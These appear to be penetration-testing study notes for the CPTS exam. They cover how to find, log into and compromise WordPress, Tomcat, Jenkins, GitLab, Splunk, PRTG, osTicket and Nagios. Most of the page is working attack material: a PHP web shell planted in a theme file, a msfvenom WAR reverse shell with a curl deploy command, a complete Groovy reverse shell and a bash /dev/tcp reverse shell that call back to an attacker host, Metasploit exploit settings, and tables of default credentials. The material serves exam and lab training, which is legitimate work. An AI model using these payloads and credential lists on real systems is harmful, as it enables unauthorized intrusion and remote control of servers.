# 22 — Attacking Common Applications

This is one of the most critical CPTS modules. The exam network contains real-world applications — not custom vulnerable PHP pages, but actual software you'll find in enterprise environments. You need to recognize each application, know its default credentials, understand its common vulnerabilities, and exploit it for initial access or lateral movement.

---

## Application Discovery Workflow

When you find a web server, identify what's running before attacking blindly:

```bash
# Technology fingerprinting
whatweb http://TARGET
curl -I http://TARGET

# Check common paths for known applications
curl -s http://TARGET/wp-login.php          # WordPress
curl -s http://TARGET/administrator         # Joomla
curl -s http://TARGET/user/login            # Drupal
curl -s http://TARGET:8080/manager          # Tomcat
curl -s http://TARGET:8080/login            # Jenkins
curl -s http://TARGET/users/sign_in         # GitLab
curl -s http://TARGET/index.php/login       # osTicket
curl -s http://TARGET:8000/en-US/account/login  # Splunk
curl -s http://TARGET/nagios/               # Nagios
curl -s http://TARGET/zabbix/              # Zabbix
curl -s http://TARGET:3000/login           # Grafana
```

---

## WordPress

### Identify and enumerate

```bash
# Confirm WordPress
curl -s http://TARGET | grep -i "wp-content\|wordpress"
curl -s http://TARGET/wp-login.php

# Check version
curl -s http://TARGET/readme.html
curl -s http://TARGET | grep "generator"
# <meta name="generator" content="WordPress 6.2.1" />

# Enumerate with wpscan
wpscan --url http://TARGET --enumerate u,p,t,cb
# u = users, p = plugins, t = themes, cb = config backups
```

### Default credentials

```
admin:admin
admin:password
admin:wordpress
```

### Attack paths

```bash
# Brute force login
wpscan --url http://TARGET -U admin,editor -P /usr/share/wordlists/rockyou.txt

# After getting admin access:
# Method 1: Theme Editor → inject PHP in 404.php
# Appearance → Theme Editor → 404.php
# Add: <?php system($_GET['cmd']); ?>
# Access: http://TARGET/wp-content/themes/THEME/404.php?cmd=whoami

# Method 2: Plugin upload
# Plugins → Add New → Upload Plugin
# Upload a malicious plugin (ZIP with PHP shell)

# Known vulnerable plugins to check:
# - Mail Masta 1.0 (LFI)
# - InfiniteWP Client < 1.9.4.5 (auth bypass)
# - WP File Manager (unauthenticated RCE)
# searchsploit each discovered plugin
```

---

## Apache Tomcat

### Identify

```bash
# Default port: 8080
curl http://TARGET:8080
# Shows Tomcat welcome page with version

# Manager interface
curl http://TARGET:8080/manager/html
# 401 Unauthorized → asks for credentials
```

### Default credentials (try ALL of these)

```
tomcat:tomcat
admin:admin
tomcat:s3cret
admin:tomcat
tomcat:changethis
role1:tomcat
both:tomcat
manager:manager
```

### Attack path — WAR file upload

Once you have manager credentials:

```bash
# Generate a WAR shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f war -o shell.war

# Upload through the manager (command line)
curl --upload-file shell.war "http://admin:admin@TARGET:8080/manager/text/deploy?path=/shell"
# Or upload through the web interface at /manager/html

# Trigger the shell
curl http://TARGET:8080/shell/

# Or with Metasploit
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET
set RPORT 8080
set HttpUsername admin
set HttpPassword admin
set LHOST KALI_IP
exploit
```

### Tomcat without manager access

```bash
# Check for AJP (port 8009) — Ghostcat vulnerability
nmap -sV -p 8009 TARGET
# CVE-2020-1938 — read files through AJP connector

# Metasploit
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS TARGET
set FILENAME /WEB-INF/web.xml
run
```

---

## Jenkins

### Identify

```bash
# Default ports: 8080, 8443
curl http://TARGET:8080/login
# Shows Jenkins login page with version

# Check for unauthenticated access
curl http://TARGET:8080
# Sometimes Jenkins doesn't require login (misconfiguration)
```

### Default credentials

```
admin:admin
admin:password
admin:jenkins
```

### Attack path — Script Console (the jackpot)

Jenkins has a Groovy script console at `/script` that executes code on the server:

```
Navigate to: http://TARGET:8080/script
```

**Groovy reverse shell:**

```groovy
String host="KALI_IP";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new java.net.Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close();
```

**Windows Groovy command execution:**

```groovy
def cmd = "cmd.exe /c whoami".execute()
println cmd.text
```

**If /script is blocked but you can create jobs:**

```
1. Create a new Freestyle project
2. Build → Add build step → Execute shell (Linux) or Execute Windows batch command
3. Enter: bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
4. Build Now → reverse shell arrives
```

---

## GitLab

### Identify

```bash
curl http://TARGET/users/sign_in
# GitLab login page

# Check version
curl http://TARGET/help
# Shows GitLab version

# Check for public repositories
curl http://TARGET/explore
```

### Default credentials

```
root:5iveL!fe     (GitLab < 14.0)
admin@local.host:password
# GitLab usually forces a password change on first login
```

### Attack paths

```bash
# Check for registration (can you create an account?)
curl http://TARGET/users/sign_up

# If you can register → look for internal repositories
# Repositories often contain credentials, SSH keys, API tokens

# CVE-2021-22205 — Unauthenticated RCE (GitLab 11.9 - 13.10.3)
# ExifTool vulnerability through image upload
searchsploit gitlab
```

---

## Splunk

### Identify

```bash
# Default port: 8000 (web), 8089 (management)
curl http://TARGET:8000
curl https://TARGET:8089
```

### Default credentials

```
admin:changeme
```

### Attack path — Custom apps for RCE

Splunk allows custom apps — which can execute code on the server:

```bash
# If you have admin access:
# 1. Create a malicious Splunk app (a tar.gz with a script)
# 2. Upload through: Settings → Apps → Install app from file
# 3. The app's script runs on the server

# Or use the Splunk REST API
curl -k -u admin:changeme https://TARGET:8089/services/search/jobs -d 'search=| sendalert reverse_shell'
```

---

## PRTG Network Monitor

### Identify

```bash
curl http://TARGET/index.htm
# PRTG login page
```

### Default credentials

```
prtgadmin:prtgadmin
```

### Attack path

```bash
# CVE-2018-9276 — Authenticated RCE via notifications
# After logging in:
# Setup → Notifications → Add New Notification
# Execute Program: set in the notification to run a command
# This executes on the PRTG server

# Metasploit
use exploit/windows/http/prtg_authenticated_rce
set RHOSTS TARGET
set ADMIN_PASSWORD prtgadmin
set LHOST KALI_IP
exploit
```

---

## osTicket

### Identify

```bash
curl http://TARGET/scp/login.php    # Staff login
curl http://TARGET/open.php         # Create ticket (user-facing)
```

### Why osTicket matters for CPTS

osTicket often holds credentials, internal communications, and sensitive information in its tickets. If you can access the staff panel, you can read all support tickets — which may contain passwords, internal IPs, and other intelligence for lateral movement.

```
Default credentials:
  ostadmin:Admin1 (or whatever was set during install)
  
Check tickets for:
  - Password reset requests (contain temporary passwords)
  - VPN access requests (contain credentials)
  - IT support tickets (contain system information)
```

---

## Nagios / Nagios XI

### Default credentials

```
nagiosadmin:nagiosadmin    (Nagios Core)
nagiosadmin:admin          (Nagios XI)
```

### Attack path

```bash
# Nagios XI — authenticated RCE via command injection
# After login, find command parameters that aren't sanitized
# CVE-2019-15949, CVE-2020-35578

# Metasploit
use exploit/linux/http/nagios_xi_authenticated_rce
set RHOSTS TARGET
set PASSWORD nagiosadmin
set LHOST KALI_IP
exploit
```

---

## Application Discovery Cheatsheet

When you find a web server, check these paths:

| Application | Detection Path | Default Port | Default Credentials |
|---|---|---|---|
| WordPress | `/wp-login.php` | 80/443 | admin:admin |
| Tomcat | `/manager/html` | 8080 | tomcat:tomcat, tomcat:s3cret |
| Jenkins | `/login`, `/script` | 8080 | admin:admin |
| GitLab | `/users/sign_in` | 80/443 | root:5iveL!fe |
| Splunk | `/en-US/account/login` | 8000 | admin:changeme |
| PRTG | `/index.htm` | 80/443 | prtgadmin:prtgadmin |
| osTicket | `/scp/login.php` | 80 | ostadmin:Admin1 |
| Nagios | `/nagios/` | 80 | nagiosadmin:nagiosadmin |
| Joomla | `/administrator` | 80 | admin:admin |
| Drupal | `/user/login` | 80 | admin:admin |
| Grafana | `/login` | 3000 | admin:admin |
| Zabbix | `/zabbix/` | 80 | Admin:zabbix |
| phpMyAdmin | `/phpmyadmin/` | 80 | root:(blank), root:root |
| Webmin | `/` | 10000 | root:root |

**On the CPTS exam:** Try EVERY set of default credentials on EVERY application you find. Many exam footholds come from applications with default or weak passwords.
